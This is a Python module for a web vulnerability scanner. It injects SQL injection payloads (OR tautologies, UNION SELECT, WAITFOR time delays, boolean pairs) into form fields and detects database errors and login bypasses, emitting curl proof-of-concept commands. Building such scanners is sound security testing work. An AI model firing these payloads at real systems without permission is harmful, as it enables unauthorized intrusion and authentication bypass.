from .base_scanner import VulnerabilityScanner
from utils.colors import print_info, print_success, print_warning, print_error
from urllib.parse import urlencode
import time

class SQLiScanner(VulnerabilityScanner):
    """
    Performs SQL Injection testing on identified forms.
    Includes error-based, boolean-blind, and response-difference detection.
    """
    def __init__(self, target_url, session, forms):
        super().__init__(target_url, session)
        self.forms = forms

    def scan(self):
        print_info(f"Starting SQL Injection Scan on {len(self.forms)} forms...")
        
        # Expanded SQLi payloads
        payloads = {
            "Classic OR": "' OR '1'='1",
            "Classic OR Comment": "' OR '1'='1' -- ",
            "Union Select": "' UNION SELECT 1,2,3,4,5 -- ",
            "Error Based": "'", 
            "Time Based": "1'; WAITFOR DELAY '0:0:5'--",
            "Boolean True": "' AND 1=1 -- ",
            "Boolean False": "' AND 1=2 -- "
        }
        
        # Expanded error signatures (including Django/Python errors)
        sql_errors = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "sqlexception",
            "valid postgresql result",
            "odbc driver",
            "sqlserver jdbc driver",
            "ora-01756",
            # Django/Python specific
            "operationalerror",
            "programming error",
            "syntax error",
            "near \"",
            "unrecognized token",
            "no such column",
            "database is locked",
            "sqlite3.operationalerror",
            "django.db.utils",
            "psycopg2",
            "pymysql",
        ]

        for form in self.forms:
            action = form["action"]
            method = form["method"]
            inputs = form["inputs"]

            print_info(f"Testing form at {action}...")

            # 1. Error-Based & Classic Injection
            for p_name, payload in payloads.items():
                if "Boolean" in p_name: continue

                data = {}
                for input_field in inputs:
                    if input_field["type"] not in ["submit", "button", "image", "file", "hidden"]:
                        data[input_field["name"]] = payload
                    elif input_field["type"] == "hidden":
                        data[input_field["name"]] = input_field.get("value", "")
                
                if not data:
                    continue
                    
                try:
                    res = self._send_request(action, method, data)
                    content = res.text.lower()
                    
                    found = False
                    for error in sql_errors:
                        if error in content:
                            print_error(f"SQLi Found ({p_name}) in {action}")
                            self.add_finding(
                                "SQL Injection",
                                f"Form at {action} returned SQL error with payload: {payload}",
                                "Critical",
                                url=action,
                                payload=payload,
                                evidence=error,
                                poc=self._generate_poc(action, method, data)
                            )
                            found = True
                            break
                    if found: break
                    
                    # Response-difference detection: if the response with SQLi payload
                    # is significantly different from normal (e.g., login bypass)
                    if p_name == "Classic OR Comment":
                        normal_data = {k: "testuser" for k, v in data.items()}
                        try:
                            normal_res = self._send_request(action, method, normal_data)
                            
                            # Check if SQLi payload caused different behavior
                            # (e.g., redirected to dashboard = login bypass)
                            if res.status_code != normal_res.status_code or \
                               (res.status_code in [301, 302] and normal_res.status_code == 200) or \
                               abs(len(res.text) - len(normal_res.text)) > 200:
                                
                                # Verify it's not just a generic error
                                if 'dashboard' in res.text.lower() or \
                                   'welcome' in res.text.lower() or \
                                   'logout' in res.text.lower() or \
                                   res.status_code in [301, 302]:
                                    print_error(f"SQLi Login Bypass detected at {action}")
                                    self.add_finding(
                                        "SQL Injection",
                                        f"SQL Injection at {action} caused authentication bypass. The payload altered the query logic.",
                                        "Critical",
                                        url=action,
                                        payload=payload,
                                        evidence=f"Normal response: {normal_res.status_code} ({len(normal_res.text)} bytes), SQLi response: {res.status_code} ({len(res.text)} bytes)",
                                        poc=self._generate_poc(action, method, data)
                                    )
                                    break
                        except:
                            pass

                except Exception as e:
                    print_warning(f"Error testing {p_name} on {action}: {e}")

            # 2. Boolean-Based Blind Injection
            target_input = next((i["name"] for i in inputs if i["type"] not in ["submit", "button", "image", "file", "hidden"]), None)
            
            if target_input:
                try:
                    base_data = {i["name"]: "test" for i in inputs if i["type"] not in ["submit", "button", "image", "file"]}
                    base_res = self._send_request(action, method, base_data)
                    base_len = len(base_res.text)

                    true_data = base_data.copy()
                    true_data[target_input] = "test" + payloads["Boolean True"]
                    true_res = self._send_request(action, method, true_data)
                    
                    false_data = base_data.copy()
                    false_data[target_input] = "test" + payloads["Boolean False"]
                    false_res = self._send_request(action, method, false_data)

                    if abs(len(true_res.text) - len(false_res.text)) > 50 and \
                       abs(len(true_res.text) - base_len) < 50:
                        
                        print_error(f"Boolean SQLi Found in {action}")
                        self.add_finding(
                            "SQL Injection",
                            f"Form at {action} responded differently to TRUE/FALSE boolean payloads, indicating SQL injection.",
                            "Critical",
                            url=action,
                            payload=payloads["Boolean True"] + " vs " + payloads["Boolean False"],
                            evidence=f"TRUE response: {len(true_res.text)} bytes, FALSE response: {len(false_res.text)} bytes",
                            poc=self._generate_poc(action, method, true_data)
                        )
                except Exception as e:
                    print_warning(f"Error testing blind SQLi on {action}: {e}")

        return self.vulnerabilities

    def _send_request(self, action, method, data):
        if method == "post":
            return self.session.post(action, data=data, timeout=10, allow_redirects=False)
        else:
            return self.session.get(action, params=data, timeout=10, allow_redirects=False)

    def _generate_poc(self, action, method, data):
        if method == "post":
             return f"curl -X POST -d '{urlencode(data)}' '{action}'"
        else:
             return f"{action}?{urlencode(data)}"
